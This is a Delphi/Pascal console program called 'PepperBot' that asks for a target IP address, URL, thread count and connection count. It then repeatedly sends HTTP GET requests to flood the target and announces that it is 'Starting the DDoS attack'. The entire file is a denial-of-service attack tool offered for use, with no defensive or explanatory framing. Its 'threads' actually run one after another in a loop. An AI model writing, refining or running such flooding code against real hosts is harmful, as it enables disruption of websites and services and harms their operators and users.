program Project1;
{$APPTYPE CONSOLE}

uses
  Windows,
  SysUtils,
  WinSock;

const
  HTTP_PORT = 80;

var
  TargetIP: string;
  TargetURL: string;
  NumThreads: Integer;
  NumConnections: Integer;

procedure SendHTTPRequest(const IPAddress, URL: string);
var
  Socket: TSocket;
  Addr: TSockAddrIn;
  HostEnt: PHostEnt;
  Request: string;
  BytesSent, I: Integer;
begin
  Socket := WinSock.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if Socket = INVALID_SOCKET then
    Exit;

  HostEnt := gethostbyname(PAnsiChar(IPAddress));
  if HostEnt = nil then
    Exit;

  Addr.sin_family := AF_INET;
  Addr.sin_port := htons(HTTP_PORT);
  Addr.sin_addr.S_addr := PInAddr(HostEnt.h_addr^).s_addr;

  if WinSock.connect(Socket, Addr, SizeOf(Addr)) = SOCKET_ERROR then
  begin
    WinSock.closesocket(Socket);
    Exit;
  end;

  Request := 'GET ' + URL + ' HTTP/1.1'#13#10 +
             'Host: ' + IPAddress + #13#10 +
             'Connection: Keep-Alive'#13#10#13#10;

  for I := 1 to NumConnections do
    BytesSent := WinSock.send(Socket, Request[1], Length(Request), 0);

  WinSock.shutdown(Socket, SD_BOTH);
  WinSock.closesocket(Socket);
end;

procedure Attack();
var
  I: Integer;
begin
  for I := 1 to NumThreads do
    SendHTTPRequest(TargetIP, TargetURL);
end;

begin
  try
    Writeln('************************************************');
    Writeln('*****       PepperBot By HaniCraft         *****');
    Writeln('************************************************');
    Writeln('');

    Write('Enter the target IP address: ');
    Readln(TargetIP);

    Write('Enter the target URL (e.g., /index.html): ');
    Readln(TargetURL);

    Write('Enter the number of threads to use: ');
    Readln(NumThreads);

    Write('Enter the number of connections per thread: ');
    Readln(NumConnections);

    Writeln('');
    Writeln('Starting the DDoS attack...');
    Writeln('');

    Attack();

    Writeln('');
    Writeln('Attack completed.');

    Readln;
  except
    on E: Exception do
      Writeln('Error: ', E.Message);
  end;
end.
